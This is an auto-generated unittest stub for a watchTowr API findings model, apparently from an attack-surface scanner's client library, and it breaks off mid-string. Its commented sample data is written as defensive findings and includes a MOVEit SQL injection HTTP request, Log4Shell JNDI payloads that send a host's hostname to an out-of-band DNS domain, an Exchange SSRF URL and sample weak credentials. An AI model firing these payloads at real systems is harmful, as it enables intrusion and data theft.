# coding: utf-8

"""
    watchTowr Platform Client API Documentation

    No description provided (generated by Openapi Generator https://github.com/openapitools/openapi-generator)

    The version of the OpenAPI document: 1.0
    Generated by OpenAPI Generator (https://openapi-generator.tech)

    Do not edit the class manually.
"""  # noqa: E501


import unittest

from watchtowr_api.models.paginated_client_findings import PaginatedClientFindings

class TestPaginatedClientFindings(unittest.TestCase):
    """PaginatedClientFindings unit test stubs"""

    def setUp(self):
        pass

    def tearDown(self):
        pass

    def make_instance(self, include_optional) -> PaginatedClientFindings:
        """Test PaginatedClientFindings
            include_option is a boolean, when False only required
            params are included, when True both required and
            optional params are included """
        # uncomment below to create an instance of `PaginatedClientFindings`
        """
        model = PaginatedClientFindings()
        if include_optional:
            return PaginatedClientFindings(
                data = [{"id":2917,"title":"Valid Credentials Discovered In Business System","created_at":"2023-11-24T07:56:51.000Z","cvssv3_score":8.6,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:F/RL:W/RC:C","description":"Through watchTowr's Credential Stuffing capabilities, a valid set of credentials have been identified to work to authenticate to a legitimately exposed business system. \n\nThese credentials have been confirmed as valid against the identified system, and are publicly available.","impact":"Depending on the system, if leveraged by an attacker it may be possible to:\n\n* Gain access to internal systems\n* Gain access to sensitive and confidential data\n* Gain VPN access for further internal exploitation and deployment of payloads such as ransomware","finding_impact":"Prioritised Findings","tags":[{"id":1,"name":"CISA-KEV"}],"evidence":"URL: https://sso.core.watchtowr.com/adfs/ls\n\nValid credentials discovered:\nUsername: dummy\nPassword: dummy123!\n\nMFA status: Single-factor authentication","recommendation":"As a priority, it is recommended that the identified credentials be revoked and rotated. As a follow-up an analysis should also be performed to ensure that the identified credentials have not previously been utilised by an attacker.\n\nAs a long-term measure to ensure that the security impact of breach credentials are minimised, it is recommended that:\n* Two-factor authentication (2FA) to be enabled for all business systems that support it, which provides an additional layer of security\n* Use a Single Sign-On (SSO) service for business systems, where possible\n","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:F/RL:W/RC:C","severity":"high","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-adversarysight-tls-ssl-certificate-transparency-discovery","status":"verified","created_at":"2023-07-24T03:03:58.000Z","updated_at":"2023-12-29T12:20:58.000Z","deleted_at":null,"id":"557","name":"sso.core.watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[],"assigned_user":{"name":"Michael"}},{"id":2803,"title":"SQL Injection (MOVEit CVE-2023-34362)","created_at":"2023-06-12T06:20:00.000Z","cvssv3_score":9.5,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:W/RC:C","description":"The affected host was found to utilise a vulnerable version of MOVEit Transfer, exposing the affected host to SQL injection. This vulnerability is tracked as CVE-2023-34362.\n\nStructured Query Language (SQL) injection vulnerabilities arise when user-controlled data is used inside SQL statements without first applying appropriate validation. An attacker can supply crafted input to break out of the data context in which the input interferes with the structure of the surrounding query.\n\nThis vulnerability can then be leveraged to gain access to an administrative account, where a deserialisation vulnerability can be exploited to achieve remote code execution. Thereafter, further exploitation steps may be taken to execute arbitrary code, deploy malware (e.g. web shells) or conduct data exfiltration on the underlying host.\n\nIt is understood that this vulnerability was initially actively exploited by the Clop ransomware group.","impact":"This vulnerability can be chained to achieve remote code execution, leading to the ability to deploy further malware (e.g. web shells) on the affected host.\n\nIf discovered and exploited by an attacker, it may be possible to:\n* Execute arbitrary code on the affected host\n* Manipulate the affected host, and data held within.\n* Gain access to the internal network\n* Reading or modifying critical application data\n* Escalating privileges within the database and taking control of the database server\n","finding_impact":"Prioritised Findings","tags":[{"id":2,"name":"Defacement"}],"evidence":"An impact-less SQL injection payload was sent to the host which would result in a delay of 10 seconds in the processing of the SQL statement. The statement provided was: \nWAITFOR DELAY '00:00:10\n\nThe following request was sent to the host, resulting in the SQL statement being stored, but not processed:\n\nPOST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1\nxx-silock-transaction: folder_add_by_path\nX-siLock-Transaction: session_setvars\nX-siLock-SessVar0: MyPkgID: 0\nX-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); WAITFOR DELAY '00:00:10' -- asdf\nCookie: ASP.NET_SessionId=kdqs2mdjvrd5kpkfn540kojm; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; siLockLongTermInstID=1958; MIDMZLang=en; JavascriptTest=0; DesignModeTest=0; NoWiz=0; WizardVersions=3.1.5.0^3.1.5.0#4BD31B20-D5CB-45c6-94B5-EA50678F0A48#3.1.5|3.1.7.0#BAACAF97-A065-46f0-BB6F-C8EDD4C00761#3.1.7|3.2.0.0#CF71EA6C-6ABF-4bb7-B140-BBB26F9BD65D#3.2.0|3.3.0.0#CD72F011-CDD1-4c44-86D4-37E97CCED9BC#3.3.0|3.3.1.0#FB5FF2C3-B7EB-4394-804A-F5820554B59A#3.3.1|3.4.0.0#A81DF11E-14EB-48f6-B7CF-8D06AB608DE3#3.4.0|3.4.2.0#C5C02C87-534E-4bcd-A007-54975CF8BBAF#3.4.2|4.0.0.0#9D27C3FA-6662-4d29-99FB-A58A405FD584#4.0.0|4.5.0.0#03DED275-9DA6-450e-8A34-26684B2DDC78#4.5.0|5.0.0.0#02E58850-DBD8-40d9-8897-1F9F9471023C#5.0.0|5.1.0.0#DC811A54-8FE7-4653-9DB6-49CEABCE705A#5.1.0|5.5.0.0#0E409091-0585-415e-88B9-820BDC57094C#5.5.0|6.0.0.0#9C5FFF8F-0FE6-47ac-A0E6-85EF424F9D32#6.0.0|6.5.0.0#F589CCFE-5DCE-4009-844F-61433375F69B#6.5.0|7.0.0.0#B25AB9F1-B8A2-4072-8964-00C7EDF99750#7.0.0|7.1.0.0#CE335477-C2B3-4b59-8305-5D9A77D1F133#7.1.0|7.1.1.0#F88513AE-2CEB-4f9a-A863-CDC9913E3308#7.1.1|7.5.0.0#B2BF7972-1410-4501-8D5E-E42445D6D6E5#7.5.0|7.5.1.0#AFD262A2-9495-44de-B08A-D721B0D0D767#7.5.1|8.0.0.0#53A13770-347C-46e5-8C8E-54F514346BED#8.0.0|8.1.0.0#32E1ADD2-BE60-450e-9DF3-7CAAD1291A26#8.1.0|8.2.0.0#D5E8967C-C451-406e-AA2F-62DB81D47CF9#8.2.0|8.3.0.0#49B0CB30-31EB-4907-8312-4EA4B02DB4E1#8.3.0|9.0.0.0#72DBA6B5-BDCD-4622-959B-9C9BD959C764#9.0.0|9.5.0.0#58804433-7A99-4f6c-A95A-38D721B7E57D#9.5.0|9.6.0.0#5C6BA75D-7888-4F07-BAB1-080C59F88D11#9.6.0; LongTermCookieExpireDate=June 15 2025 04:54:33; visid_incap_2094604=YBTCYvZBSeevg/faM8K2pAgpimQAAAAAQUIPAAAAAADw/SibzJoQRPWarB3iKXAc; incap_ses_1557_2094604=HbzAS4hxOQccqnmmn5ObFQgpimQAAAAAAbhi+AutUsuttjtDULDSpQ==\nContent-Length: 0\n\n\n\nThereafter, a separate request was sent to the host to trigger the stored SQL statement. The server took more than 10 seconds to respond, indicating that the stored SQL statement was processed:\n\nPOST /guestaccess.aspx HTTP/1.1\nxx-silock-transaction: folder_add_by_path\nX-siLock-Transaction: session_setvars\nX-siLock-SessVar0: MyPkgID: 0\nX-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); WAITFOR DELAY '00:00:10' -- asdf\nCookie: ASP.NET_SessionId=kdqs2mdjvrd5kpkfn540kojm; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; siLockLongTermInstID=1958; MIDMZLang=en; JavascriptTest=0; DesignModeTest=0; NoWiz=0; WizardVersions=3.1.5.0^3.1.5.0#4BD31B20-D5CB-45c6-94B5-EA50678F0A48#3.1.5|3.1.7.0#BAACAF97-A065-46f0-BB6F-C8EDD4C00761#3.1.7|3.2.0.0#CF71EA6C-6ABF-4bb7-B140-BBB26F9BD65D#3.2.0|3.3.0.0#CD72F011-CDD1-4c44-86D4-37E97CCED9BC#3.3.0|3.3.1.0#FB5FF2C3-B7EB-4394-804A-F5820554B59A#3.3.1|3.4.0.0#A81DF11E-14EB-48f6-B7CF-8D06AB608DE3#3.4.0|3.4.2.0#C5C02C87-534E-4bcd-A007-54975CF8BBAF#3.4.2|4.0.0.0#9D27C3FA-6662-4d29-99FB-A58A405FD584#4.0.0|4.5.0.0#03DED275-9DA6-450e-8A34-26684B2DDC78#4.5.0|5.0.0.0#02E58850-DBD8-40d9-8897-1F9F9471023C#5.0.0|5.1.0.0#DC811A54-8FE7-4653-9DB6-49CEABCE705A#5.1.0|5.5.0.0#0E409091-0585-415e-88B9-820BDC57094C#5.5.0|6.0.0.0#9C5FFF8F-0FE6-47ac-A0E6-85EF424F9D32#6.0.0|6.5.0.0#F589CCFE-5DCE-4009-844F-61433375F69B#6.5.0|7.0.0.0#B25AB9F1-B8A2-4072-8964-00C7EDF99750#7.0.0|7.1.0.0#CE335477-C2B3-4b59-8305-5D9A77D1F133#7.1.0|7.1.1.0#F88513AE-2CEB-4f9a-A863-CDC9913E3308#7.1.1|7.5.0.0#B2BF7972-1410-4501-8D5E-E42445D6D6E5#7.5.0|7.5.1.0#AFD262A2-9495-44de-B08A-D721B0D0D767#7.5.1|8.0.0.0#53A13770-347C-46e5-8C8E-54F514346BED#8.0.0|8.1.0.0#32E1ADD2-BE60-450e-9DF3-7CAAD1291A26#8.1.0|8.2.0.0#D5E8967C-C451-406e-AA2F-62DB81D47CF9#8.2.0|8.3.0.0#49B0CB30-31EB-4907-8312-4EA4B02DB4E1#8.3.0|9.0.0.0#72DBA6B5-BDCD-4622-959B-9C9BD959C764#9.0.0|9.5.0.0#58804433-7A99-4f6c-A95A-38D721B7E57D#9.5.0|9.6.0.0#5C6BA75D-7888-4F07-BAB1-080C59F88D11#9.6.0; LongTermCookieExpireDate=June 15 2025 04:54:33; visid_incap_2094604=YBTCYvZBSeevg/faM8K2pAgpimQAAAAAQUIPAAAAAADw/SibzJoQRPWarB3iKXAc; incap_ses_1557_2094604=HbzAS4hxOQccqnmmn5ObFQgpimQAAAAAAbhi+AutUsuttjtDULDSpQ==\nContent-Length: 0\n","recommendation":"The following versions are affected by the vulnerability CVE-2023-34362:\n\nMOVEit Transfer 2023.0.0 (15.0) and earlier\nMOVEit Transfer 2022.1.5 (14.1) and earlier\nMOVEit Transfer 2022.0.4 (14.0) and earlier\nMOVEit Transfer 2021.0.6 (13.0) and earlier\nMOVEit Transfer 2020.1.0 (12.1) and earlier\nMOVEit Transfer 2020.0.x(12.0) and earlier – no patch is available for this version\n\nAny other earlier version of MOVEit Transfer should also be considered to be vulnerable.\n\nIt is recommended that the host be upgraded to a patched version of MOVEit Transfer. As there are known active exploitation of the vulnerability, it is recommended that the host be reviewed internally if the hosts have been previously compromised by attackers through the Indicator of Compromised (IOC) provided by the advisory.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:W/RC:C","severity":"critical","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-demo-data","status":"verified","created_at":"2023-06-09T09:35:54.000Z","updated_at":"2023-12-28T20:03:09.000Z","deleted_at":null,"id":"552","name":"moveit-demo.watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2023-34362","epss_score":"0.899420000","retest_history":[],"assigned_user":null},{"id":2716,"title":"Email DNS Records Vulnerable To Takeover","created_at":"2023-02-07T02:52:33.000Z","cvssv3_score":8.7,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C","description":"The affected hostname was identified to specify MX records (email server DNS records) where the specified priority mail server top-level domain name had expired and was available for registration.\n\nIf the unregistered domain name was identified by an attacker, an attacker would be able to register this domain name for minimal expense and deploy infrastructure to receive email on behalf of the affected hostname.\n\n","impact":"If discovered and exploited by an attacker, it would be possible to;\n\n* Receive password reset emails\n* Intercept confidential information\n* Perform phishing attacks with the affected hostname\n\nand many other attacks - limited only by their creativity.","finding_impact":"Prioritised Findings","tags":[{"id":3,"name":"Sensitive Data"}],"evidence":"A hostname belonging to an unregistered domain is specified as a mail server for the affected host (test.com).\n\nThe following domain is found to be unregistered:\nDomain: doesnotexist.cz\n\nThis unregistered domain is specified within the configured MX records for test.com - which could be abused by an attacker to receive email intended for the affected host, if registered.\n\nRaw 'dig' output indicating the MX records that currently exist for this domain can be found below:\n\n\n; <<>> DiG 9.16.33-Debian <<>> MX test.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58866\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 65494\n;; QUESTION SECTION:\n;test.com.\t\tIN\tMX\n\n;; ANSWER SECTION:\ntest.com.\t1798\tIN\tMX\t10 mail.doesnotexist.cz.\ntest.com.\t1798\tIN\tMX\t20 dm2.doesnotexist.cz.\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Thu Feb 02 08:05:34 UTC 2023\n;; MSG SIZE  rcvd: 107\n","recommendation":"It is recommended that the affected MX records, pointing to the unregistered domain name, be removed to ensure that email is only handled by intended authorised mail servers.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C","severity":"high","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[],"assigned_user":null},{"id":2648,"title":"Weak Credentials In Use (FTP)","created_at":"2023-02-01T21:33:15.000Z","cvssv3_score":6.2,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:H/RL:O/RC:C","description":"The affected host was identified to exposed an FTP server utilising weak credentials.","impact":"If discovered and exploited by an attacker, it may be possible to;\n\n* Access sensitive data stored on the host\n* Upload data to the affected host\n* Modify data stored on the affected host","finding_impact":"Prioritised Findings","tags":[],"evidence":"The following credentials were discovered to be valid for the FTP service listening on 18.143.202.5:21\n\nUsername: root\nPassword: http\n","recommendation":"It is recommended that access to the FTP server from the Internet be restricted if there is no strict requirement for this service to be exposed, and that the weak credentials identified be rotated and reset to strong credentials.\n\nFurthermore, it is recommended that actions are taken to ensure that the discovered weak credentials have not already been utilised by an attacker.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:H/RL:O/RC:C","severity":"medium","status":"confirmed","affected":{"data":{"type":"TCP","status":"verified","created_at":"2022-12-15T10:21:55.000Z","updated_at":"2023-01-26T04:08:15.000Z","id":"167","ip":"18.143.202.5","ip_id":140,"port":21,"banner":"220 Welcome to the Go FTP Server\r\n","service":"ftp","businessUnits":[]}},"cve_id":null,"epss_score":null,"retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"},{"requested_by":"User Name","requested_at":"2024-01-23T03:34:53.000Z","retest_status":"success","completed_at":"2024-01-23T03:37:41.000Z","evidence":"Some evidence"}],"assigned_user":null},{"id":2586,"title":"Log4Shell Remote Code Execution (CVE-2021-44228)","created_at":"2023-01-31T11:43:35.000Z","cvssv3_score":9.4,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C","description":"The affected host was identified to be vulnerable to Log4Shell, tracked as CVE-2021-44228.\n\nLog4Shell takes advantage of vulnerable version of Log4J allowing requests to arbitrary LDAP and JNDI servers, allowing attackers to execute arbitrary Java code on a server or other computer, or leak sensitive information.\n\nLog4J is a popular logging framework for Java-based applications, with certain versions vulnerable to Remote Code Execution when Log4J logs user-controlled input, with a specially crafted payload.\n\nFor the purposes of identification of this weakness, watchTowr leverages an impact-less payload that, within vulnerable Log4J deployments, triggers a DNS request containing the hostname of the affected machine to watchTowr-controlled infrastructure to confirm with high-fidelity that this host is vulnerable. Given the deep processing of data by Log4J, it is important to note that the target system (that the payload was initially sent to, and indicated within the request) may not be the vulnerable system.","impact":"If leveraged, this vulnerability could allow an attacker to;\n\n* Execute arbitrary code on the affected host\n* Gain access to the underlying host and affected data\n* Tunnel access to internal systems","finding_impact":"Prioritised Findings","tags":[],"evidence":"https://watchtowr.com:443\n\nThe request sends a Log4J payload with a JNDI expression of ${hostName} to extract the host's hostname environment variable using the raw payload of \"${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\".\n\nThe vulnerable service evaluated the JNDI payload, and created a pingback to watchTowr-owned infrastructure, 22a42245-58a5-4640-9e84-b7925bf23b22.WATCHTOWR-HOSTNAME.oob.dns.outbound.watchtowr.com. This allows us to attribute the vulnerable machine's hostname as \"WATCHTOWR-HOSTNAME\".\n\nSubsequent to this DNS lookup, an LDAP connection was observed from the affected host attempting to connect to watchTowr infrastructure.\n\nAffected parameters:\nGet Parameter\n\nRaw Payload: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nResponse:\n[22a42245-58a5-4640-9e84-b7925bf23b22.WATCHTOWR-HOSTNAME.oob.dns.outbound.watchtowr.com] Received DNS interaction\nExtracted internal hostname: WATCHTOWR-HOSTNAME\n\nSample Request:\nGET /?watchtowr=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}&watchtowr=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nHost: watchtowr.com\nX-Api-Version: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nReferer: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nUser-Agent: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Druid-Comment: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nOrigin: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nLocation: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Forwarded-For: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Forwarded-Host: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nCookie: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept-Encoding: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept-Language: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccess-Control-Request-Headers: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccess-Control-Request-Method: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAuthentication: Bearer ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-CSRF-Token: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Origin: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nUpgrade-Insecure-Requests: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}","recommendation":"We recommend that a review is done to identify and determine which vulnerable system may be processing JNDI payloads within a vulnerable instance of Log4J.\n\nIt is important to note that given the typical usage of Log4J, the target system (that the payload was initially sent to) may not be the vulnerable system and thus we recommend reviewing the extracted hostname within the evidence, and the parameter in which the confirmed payload was sent within, to allow for precise remediation.\n\nIf patching of the affected Log4J instance is not immediately possible, we recommend starting your server with log4j2.formatMsgNoLookups set to true.\n\nFurthermore, it is recommended that actions are taken to ensure that the vulnerability has not already been abused by an attacker.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C","severity":"critical","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2021-44228","epss_score":"0.974540000","retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null},{"id":2518,"title":"Management Interface Exposed (SSH)","created_at":"2023-01-18T00:27:36.000Z","cvssv3_score":3.5,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:F/RL:W/RC:C","description":"An SSH management interface was found to be exposed to the internet on the affected host. Allowing management services to be accessible from untrusted networks increases the attack surface of a host, and related network.\n\nIf a weak password is in use or the credentials can be compromised (e.g. via a brute-force attack) an attacker could gain access to privileged functions.","impact":"An exposed management interface could enable external attackers to target sensitive functionality directly, leading to a compromise of the underlying host or data held within.\n\nAccess to a management interface can be achieved in many ways once identified, including password bruteforce, credential reuse and spraying, or a vulnerability in the management interface itself.","finding_impact":"Prioritised Findings","tags":[],"evidence":"An SSH administrative interface was found to be exposed on the following IP & port:\nIP Address: 1.1.1.1\nPort: 22\nBanner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13","recommendation":"Direct remote access to management interfaces should strictly be disabled by default. It is strongly recommended that access to the management service be restricted to the organisation's internal network.\n\nIf external remote access is required, whitelist network-level access controls should be implemented to ensure that only authorised IP Addresses are allowed to access the environment or a connection via a secured VPN facility with authentication credentials.\n\nAdditional strengthening of the security posture of the interface by implementing multi-factor authentication (e.g. hardware one-time tokens, SMS or software tokens) should also be considered.","references":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:F/RL:W/RC:C","severity":"low","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null},{"id":649,"title":"Potential Exposure to Microsoft Exchange 0-Day Vulnerability","created_at":"2022-10-15T11:05:00.000Z","cvssv3_score":7.1,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:R","description":"The affected host was identified to be utilising a version of Microsoft Exchange that is vulnerable to a post-authenticated Server-Side Request Forgery (SSRF) vulnerability, tracked as CVE-2022-41040. \n\nThis vulnerability is also commonly associated with the \"ProxyNotShell\" exploit, where the post-authenticated SSRF was abused as an initial stepping stone to an RCE exploit (tracked under CVE-2022-41082).\n\nSSRF vulnerabilities allow an attacker to induce or coerce server-side applications to issue a back-end lookup, and protocol-specific request (in this case, HTTP request) to an attacker-supplied location. The response from the back-end request is returned in the application's front-end response, allowing an attacker to browse internal and restricted systems.\n\nSpecific to this vulnerability, this SSRF would allow an attacker to access the PowerShell Remoting service typically available to an exchange server. This could then be abused by an attacker to perform object deserialization and conversion operations outlined in CVE-2022-41082, leading to remote code execution.","impact":"If discovered and exploited by an attacker, it may be possible to;\n\n* Abuse the SSRF vulnerability to invoke PowerShell Remoting, which may be further exploited to gain RCE on the vulnerable Exchange via object deserialization\n* Access other backend services available to the Exchange server","finding_impact":"Prioritised Findings","tags":[{"id":4,"name":"Credentials"}],"evidence":"Affected URL: http://autodiscover.watchtowr.com/autodiscover/autodiscover.json?@2GAQpUSRSmGb9sbrpz8K7OxI1iC.com/%50owershell?=&Email=autodiscover/autodiscover.json?@2GAQpUSRSmGb9sbrpz8K7OxI1iC.com\n\n","recommendation":"It is recommended that the affected instance of Microsoft Exchange be upgraded to a version that includes a patch for CVE-2022-41040.\n\nThe vulnerability has been addressed in the following Microsoft Updates:\n* Microsoft Exchange Server 2016 Cumulative Update 23\n* Microsoft Exchange Server 2019 Cumulative Update 12\n* Microsoft Exchange Server 2019 Cumulative Update 11\n* Microsoft Exchange Server 2016 Cumulative Update 22\n* Microsoft Exchange Server 2013 Cumulative Update 23","references":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:R","severity":"high","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-adversarysight-subdomain-general-bruteforce-gobuster","status":"verified","created_at":"2022-09-24T21:05:46.000Z","updated_at":"2023-12-28T22:01:05.000Z","deleted_at":null,"id":"43","name":"autodiscover.watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2022-41040","epss_score":"0.965310000","retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null}],
                meta = watchtowr_api.models.meta.Meta(
                    pagination = {"total":20,"count":10,"per_page":10,"current_page":1,"total_pages":2,"links":{"previous":"url","next":"url"}}, )
            )
        else:
            return PaginatedClientFindings(
                data = [{"id":2917,"title":"Valid Credentials Discovered In Business System","created_at":"2023-11-24T07:56:51.000Z","cvssv3_score":8.6,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:F/RL:W/RC:C","description":"Through watchTowr's Credential Stuffing capabilities, a valid set of credentials have been identified to work to authenticate to a legitimately exposed business system. \n\nThese credentials have been confirmed as valid against the identified system, and are publicly available.","impact":"Depending on the system, if leveraged by an attacker it may be possible to:\n\n* Gain access to internal systems\n* Gain access to sensitive and confidential data\n* Gain VPN access for further internal exploitation and deployment of payloads such as ransomware","finding_impact":"Prioritised Findings","tags":[{"id":1,"name":"CISA-KEV"}],"evidence":"URL: https://sso.core.watchtowr.com/adfs/ls\n\nValid credentials discovered:\nUsername: dummy\nPassword: dummy123!\n\nMFA status: Single-factor authentication","recommendation":"As a priority, it is recommended that the identified credentials be revoked and rotated. As a follow-up an analysis should also be performed to ensure that the identified credentials have not previously been utilised by an attacker.\n\nAs a long-term measure to ensure that the security impact of breach credentials are minimised, it is recommended that:\n* Two-factor authentication (2FA) to be enabled for all business systems that support it, which provides an additional layer of security\n* Use a Single Sign-On (SSO) service for business systems, where possible\n","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:F/RL:W/RC:C","severity":"high","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-adversarysight-tls-ssl-certificate-transparency-discovery","status":"verified","created_at":"2023-07-24T03:03:58.000Z","updated_at":"2023-12-29T12:20:58.000Z","deleted_at":null,"id":"557","name":"sso.core.watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[],"assigned_user":{"name":"Michael"}},{"id":2803,"title":"SQL Injection (MOVEit CVE-2023-34362)","created_at":"2023-06-12T06:20:00.000Z","cvssv3_score":9.5,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:W/RC:C","description":"The affected host was found to utilise a vulnerable version of MOVEit Transfer, exposing the affected host to SQL injection. This vulnerability is tracked as CVE-2023-34362.\n\nStructured Query Language (SQL) injection vulnerabilities arise when user-controlled data is used inside SQL statements without first applying appropriate validation. An attacker can supply crafted input to break out of the data context in which the input interferes with the structure of the surrounding query.\n\nThis vulnerability can then be leveraged to gain access to an administrative account, where a deserialisation vulnerability can be exploited to achieve remote code execution. Thereafter, further exploitation steps may be taken to execute arbitrary code, deploy malware (e.g. web shells) or conduct data exfiltration on the underlying host.\n\nIt is understood that this vulnerability was initially actively exploited by the Clop ransomware group.","impact":"This vulnerability can be chained to achieve remote code execution, leading to the ability to deploy further malware (e.g. web shells) on the affected host.\n\nIf discovered and exploited by an attacker, it may be possible to:\n* Execute arbitrary code on the affected host\n* 